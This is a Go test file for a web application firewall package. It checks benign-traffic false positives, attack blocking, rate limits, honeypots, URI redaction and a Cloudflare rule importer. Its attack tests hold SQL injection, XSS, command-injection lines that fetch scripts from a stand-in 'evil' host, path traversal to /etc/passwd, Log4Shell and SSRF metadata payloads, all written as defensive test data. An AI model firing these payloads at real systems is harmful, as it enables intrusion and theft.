package guardian

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func evalWith(s *Store, ip, uri, cookie, referer string) Decision {
	r := req("x.test", ip, "Mozilla/5.0", uri)
	if cookie != "" {
		r.Header["Cookie"] = []string{cookie}
	}
	if referer != "" {
		r.Header["Referer"] = []string{referer}
	}
	return s.Evaluate(r)
}

// Ordinary requests that the v0.2/v0.3 default WAF rules blocked.
func TestDefaultWAFAllowsOrdinaryTraffic(t *testing.T) {
	s := newStore(t, Config{})
	benign := []struct{ name, uri, cookie, referer string }{
		{"query only=", "/api/events?only=person&limit=50", "", ""},
		{"query online=", "/status?online=1", "", ""},
		{"cookie onboarding", "/", "theme=dark; onboarding=done", ""},
		{"referer with one=", "/", "", "https://www.google.com/search?q=frigate&oq=frigate&one=1"},
		{"slug with -- and", "/movies/tom-and-jerry--the-movie", "", ""},
		{"JWT cookie", "/api/review", "frigate_token=eyJhbGci--Xy-or-Zz.abc", ""},
		{"cookie named nc after ;", "/", "lang=en; nc=1", ""},
		{"search text", "/search?q=rock%20and%20roll%20--%20live", "", ""},
		{"note title", "/obsidian/notes%2F2024%20--%20plans%20and%20ideas.md", "", ""},
		{"apostrophe name", "/search?q=O%27Brien%20and%20sons", "", ""},
		{"percent sign", "/search?q=100%25%20cotton", "", ""},
		{"pipe in query", "/api?fields=a|b|c", "", ""},
	}
	for _, b := range benign {
		if d := evalWith(s, "192.0.2.77", b.uri, b.cookie, b.referer); d.Block {
			t.Errorf("false positive %q -> %s", b.name, d.Reason)
		}
	}
}

func TestDefaultWAFStillBlocksAttacks(t *testing.T) {
	s := newStore(t, Config{})
	attacks := map[string]string{
		"/login?user=admin%27--":                        "sqli-boolean-comment",
		"/item?id=1%27%20or%20%271%27=%271":             "sqli-boolean-comment",
		"/item?id=1%20OR%201=1":                         "sqli-boolean-comment",
		"/item?id=1%20union%20select%20password":        "sqli-union",
		"/?q=%3Cscript%3Ealert(1)%3C/script%3E":         "xss-pattern",
		"/?q=%3Cimg%20src=x%20onerror=alert(1)%3E":      "xss-pattern",
		"/?q=%3Csvg/onload=alert(1)%3E":                 "xss-pattern",
		"/?next=javascript:alert(1)":                    "xss-pattern",
		"/?q=%3Ciframe%20src=//evil%3E":                 "xss-pattern",
		"/cgi?x=;curl%20http://evil/x.sh":               "command-injection",
		"/cgi?x=|wget+http://evil":                      "command-injection",
		"/cgi?x=$(curl%20evil)":                         "command-injection",
		"/cgi?x=%60wget%20evil%60":                      "command-injection",
		"/file?name=a.txt%2500.php":                     "null-byte",
		"/static/..%2f..%2fetc/passwd":                  "path-traversal",
		"/?x=${jndi:ldap://evil/a}":                     "log4shell",
		"/fetch?url=http://169.254.169.254/latest/meta": "ssrf-metadata",
	}
	for uri, rule := range attacks {
		if d := evalWith(s, "192.0.2.88", uri, "", ""); d.Reason != "waf-"+rule {
			t.Errorf("%s: got %q, want waf-%s", uri, d.Reason, rule)
		}
	}
}

func TestRecommendedMergeReplacesOldFalsePositiveRules(t *testing.T) {
	cfg := Config{WAFRules: []WAFRule{
		{Name: "xss-pattern", Pattern: `(?i)(<script\b|javascript:|\bon\w+\s*=)`, Enabled: true},
		{Name: "sqli-boolean-comment", Pattern: `(?i)(--|#|/\*).*(\bor\b|\band\b)`, Enabled: true},
		{Name: "null-byte", Pattern: `(?i)%00`, Enabled: true},
		{Name: "my-rule", Pattern: `secret-probe`, Enabled: true},
		// Customized (host-scoped) copies are the user's and stay.
		{Name: "xss-pattern", Pattern: `(?i)(<script\b|javascript:|\bon\w+\s*=)`, Enabled: true, Hosts: []string{"legacy.test"}},
	}}
	stats := MergeRecommendedRules(&cfg)
	if stats.WAFRemoved != 3 {
		t.Fatalf("removed %d legacy rules, want 3", stats.WAFRemoved)
	}
	patterns := map[string]bool{}
	for _, r := range cfg.WAFRules {
		patterns[r.Pattern] = true
	}
	if patterns[`(?i)(--|#|/\*).*(\bor\b|\band\b)`] || !patterns[`secret-probe`] {
		t.Fatalf("unexpected rules after merge: %+v", cfg.WAFRules)
	}
	for _, d := range defaultConfig().WAFRules {
		if !patterns[d.Pattern] {
			t.Errorf("default %s missing after merge", d.Name)
		}
	}
}

func fingerprintCfg() Config {
	return Config{
		RateLimit:           RateLimit{Enabled: true, RequestsPerMinute: 1, Burst: 1},
		FingerprintTracking: FingerprintTracking{Enabled: true, Threshold: 3, WindowSeconds: 300, BanSeconds: 3600},
	}
}

func TestFingerprintNeedsSeveralClients(t *testing.T) {
	s := newStore(t, fingerprintCfg())
	attack := func(ip string) Decision {
		r := req("x.test", ip, "Mozilla/5.0 Chrome/140", "/?q=%3Cscript%3E")
		r.Header["Accept"] = []string{"text/html"}
		return s.Evaluate(r)
	}
	for i := 0; i < 5; i++ {
		attack("198.51.100.1")
	}
	if n := len(s.FingerprintBansSnapshot()); n != 0 {
		t.Fatalf("one client produced %d fingerprint bans; the IP auto-ban covers that", n)
	}
	attack("198.51.100.2")
	if n := len(s.FingerprintBansSnapshot()); n != 1 {
		t.Fatalf("same attack from a second client: %d fingerprint bans, want 1", n)
	}
	if d := attack("203.0.113.50"); d.Reason != "fingerprint-ban" {
		t.Fatalf("third client not caught by the fingerprint: %+v", d)
	}
}

func TestRateLimitBlocksDoNotBanAFingerprint(t *testing.T) {
	s := newStore(t, fingerprintCfg())
	for _, ip := range []string{"198.51.100.1", "198.51.100.2", "198.51.100.3"} {
		for i := 0; i < 5; i++ {
			r := req("x.test", ip, "Mozilla/5.0 Chrome/140", "/")
			r.Header["Accept"] = []string{"text/html"}
			s.Evaluate(r)
		}
	}
	if n := len(s.FingerprintBansSnapshot()); n != 0 {
		t.Fatalf("rate-limited normal page loads banned %d browser fingerprints", n)
	}
}

func TestExemptClientsAreNeverBlocked(t *testing.T) {
	cfg := honeypotCfg()
	cfg.ExemptCIDRs = []string{"192.168.1.0/24", "2001:db8:aaaa::/48"}
	cfg.IPBlocklist = []ScopedEntry{{Value: "192.168.1.50"}}
	s := newStore(t, cfg)
	for _, ip := range []string{"192.168.1.50", "2001:db8:aaaa:1::9"} {
		if d := s.Evaluate(req("x.test", ip, "sqlmap", "/.env?q=%3Cscript%3E")); d.Block {
			t.Errorf("exempt %s blocked: %+v", ip, d)
		}
		if banned, _ := s.IsTempBanned(banKey(ip)); banned {
			t.Errorf("exempt %s banned", ip)
		}
	}
	if err := s.Update(Config{ExemptCIDRs: []string{"not-an-ip"}}); err == nil {
		t.Fatal("invalid exempt entry accepted")
	}
}

func TestRateLimitResponseHasRetryAfter(t *testing.T) {
	rec := httptest.NewRecorder()
	WriteBlockResponse(rec, Decision{Block: true, Reason: "rate-limit", Status: http.StatusTooManyRequests})
	if rec.Code != 429 || rec.Header().Get("Retry-After") == "" {
		t.Fatalf("got %d, Retry-After=%q", rec.Code, rec.Header().Get("Retry-After"))
	}
}

func TestDefaultRateLimitAllowsADashboardBurst(t *testing.T) {
	s := newStore(t, Config{RateLimit: RateLimit{Enabled: true}})
	for i := 0; i < 150; i++ { // a camera/media dashboard opening
		if d := s.Evaluate(req("x.test", "198.51.100.9", "Mozilla/5.0", "/api/thumb")); d.Block {
			t.Fatalf("request %d blocked: %+v", i, d)
		}
	}
}

func TestExactHoneypotPath(t *testing.T) {
	s := newStore(t, Config{Honeypot: Honeypot{Enabled: true, BanSeconds: 60, Paths: []ScopedEntry{{Value: "=/xmlrpc.php"}}}})
	if d := s.Evaluate(req("x.test", "192.0.2.1", "ua", "/XMLRPC.php")); d.Reason != "honeypot" {
		t.Errorf("exact path not matched: %+v", d)
	}
	if d := s.Evaluate(req("x.test", "192.0.2.2", "ua", "/blog/xmlrpc.php.txt")); d.Block {
		t.Errorf("exact path matched a different path: %+v", d)
	}
}

func TestRedactionCoversSignedURLsAndBadQueries(t *testing.T) {
	for in, leaked := range map[string]string{
		"/api/camera_proxy/camera.x?authSig=eyJ0eXAiOiJKV1Qi": "eyJ0eXAi",
		"/cb?code=abc&state=1":                                "abc",
		"/x?token=s3cr3t&bad=%zz":                             "s3cr3t", // unparsable query
	} {
		if out := redactRequestURI(in); strings.Contains(out, leaked) {
			t.Errorf("redactRequestURI(%q) = %q still contains %q", in, out, leaked)
		}
	}
}

func TestCloudflareImporterSyntax(t *testing.T) {
	cases := map[string]func(CFImportResult) bool{
		// Symbolic operators and lower()
		`lower(http.user_agent) ~ "curl" || http.request.uri.path == "/xmlrpc.php"`: func(r CFImportResult) bool {
			return len(r.UABlocklist) == 1 && len(r.Honeypot) == 1 && r.Honeypot[0].Value == "=/xmlrpc.php"
		},
		// Raw strings
		`http.request.uri.path matches r"^/wp-(admin|login)"`: func(r CFImportResult) bool {
			return len(r.WAFRules) == 1 && r.WAFRules[0].Pattern == `^(?:/wp-(admin|login))`
		},
		// Bare boolean fields are warnings, not parse errors
		`(cf.client.bot) or (http.user_agent contains "zgrab")`: func(r CFImportResult) bool {
			return len(r.UABlocklist) == 1 && len(r.Warnings) == 1
		},
		// IPv6 starting with a letter, commas in sets
		`ip.src in {fe80::/10, 192.0.2.0/24 2001:db8::1}`: func(r CFImportResult) bool {
			return len(r.IPBlocklist) == 3
		},
		`ip.src eq 203.0.113.7`: func(r CFImportResult) bool {
			return len(r.IPBlocklist) == 1
		},
		// full URI / query → WAF (a honeypot never sees the query)
		`http.request.full_uri contains "?author="`: func(r CFImportResult) bool {
			return len(r.WAFRules) == 1 && len(r.Honeypot) == 0
		},
		`http.request.uri.path in {"/.env" "/config.json"}`: func(r CFImportResult) bool {
			return len(r.Honeypot) == 2 && r.Honeypot[0].Value == "=/.env"
		},
		`http.user_agent in {"Go-http-client/1.1"}`: func(r CFImportResult) bool {
			return len(r.UABlocklist) == 1 && r.UABlocklist[0].Value == `^Go-http-client/1\.1$`
		},
		// A regex Go can't compile is a warning in preview, not an Apply failure
		`http.user_agent matches "(?<=bot)x"`: func(r CFImportResult) bool {
			return len(r.UABlocklist) == 0 && len(r.Warnings) == 1
		},
	}
	for expr, ok := range cases {
		res, err := ParseCloudflareRules(expr)
		if err != nil {
			t.Errorf("%s: %v", expr, err)
			continue
		}
		if !ok(res) {
			t.Errorf("%s: unexpected result %+v", expr, res)
		}
	}
	if _, err := ParseCloudflareRules(`ip.src in $bad_ips`); err == nil || !strings.Contains(err.Error(), "lists") {
		t.Errorf("list reference: want a clear error, got %v", err)
	}
}

func TestImportedPathRegexIgnoresQuery(t *testing.T) {
	res, err := ParseCloudflareRules(`http.request.uri.path matches "/admin"`)
	if err != nil || len(res.WAFRules) != 1 {
		t.Fatalf("parse: %v %+v", err, res)
	}
	s := newStore(t, Config{WAFRules: res.WAFRules})
	if d := s.Evaluate(req("x.test", "192.0.2.3", "ua", "/search?q=/admin")); d.Block {
		t.Errorf("path rule matched the query string: %+v", d)
	}
	if d := s.Evaluate(req("x.test", "192.0.2.4", "ua", "/site/admin/x")); !d.Block {
		t.Errorf("path rule missed the path: %+v", d)
	}
}
